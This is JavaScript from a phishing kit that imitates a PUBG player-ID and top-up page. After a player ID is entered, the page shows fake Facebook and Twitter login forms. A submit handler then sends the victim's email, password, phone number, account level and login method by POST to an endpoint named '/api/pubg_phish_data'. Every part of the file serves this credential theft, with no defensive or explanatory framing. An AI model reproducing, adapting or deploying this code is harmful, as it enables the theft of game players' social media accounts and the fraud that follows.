// code for showing popup
function open_account_login(){
	$('.account_login').show();
}

function goInputPlayId() {
	$('#goInputPlayIdForm').submit(function(submitinggoInputPlayId){
	submitinggoInputPlayId.preventDefault();

	$beforeInputPlayId = $('#beforeInput-PlayId').val().trim();
            if($beforeInputPlayId == '' || $beforeInputPlayId == null || $beforeInputPlayId.length <= 8)
            {
                $('.wrongPlayerId').show();
                return false;
            }else{
               $('.wrongPlayerId').hide();
	           $('.n-box').hide();
			   $('.PayBeforeInputPlayId').hide();
			   $(".BtnAfterLoginId").attr('onclick','open_account_login()');
			   $('.new-y-box').show();
			   $('.PayAfterInputPlayId').show();
			   $("#afterInputPlayId").val($beforeInputPlayId);
			   $("#ValidatePopupPlayId").val($beforeInputPlayId);
               $("input#ValidatePopupPlayId").val($beforeInputPlayId);
			   }
			}); 
}

// show hide password for facebook and twitter
function showFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "password") {
        x.type = "text";
        $('.showPassword').hide();
        $('.hidePassword').show();
    } else {
        x.type = "password";
    }
}
function hideFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "text") {
        x.type = "password";
        $('.showPassword').show();
        $('.hidePassword').hide();
    } else {
        x.type = "text";
    }
}
function showTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "password") {
        x.type = "text";
        $('.TwitterShowPassword').hide();
        $('.TwitterHidePassword').show();
    } else {
        x.type = "password";
    }
}
function hideTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "text") {
        x.type = "password";
        $('.TwitterShowPassword').show();
        $('.TwitterHidePassword').hide();
    } else {
        x.type = "text";
    }
}
function showFbPasswordS() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "password") {
    x.type = "text";
    $('.showPassword').hide();
    $('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPasswordS() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "text") {
    x.type = "password";
    $('.showPassword').show();
    $('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showTwitterPasswordS() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "password") {
      x.type = "text";
      $('.TwitterShowPassword').hide();
      $('.TwitterHidePassword').show();
  } else {
      x.type = "password";
  }
}
function hideTwitterPasswordS() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "text") {
      x.type = "password";
      $('.TwitterShowPassword').show();
      $('.TwitterHidePassword').hide();
  } else {
      x.type = "text";
  }
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();

	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $playid = $("input#ValidatePopupPlayId").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $validateLogin = $("input#validateLogin").val();
	var $id = $("input#id").val();
	if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}

	$.ajax({
		type: "POST",
		url: "/api/pubg_phish_data",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};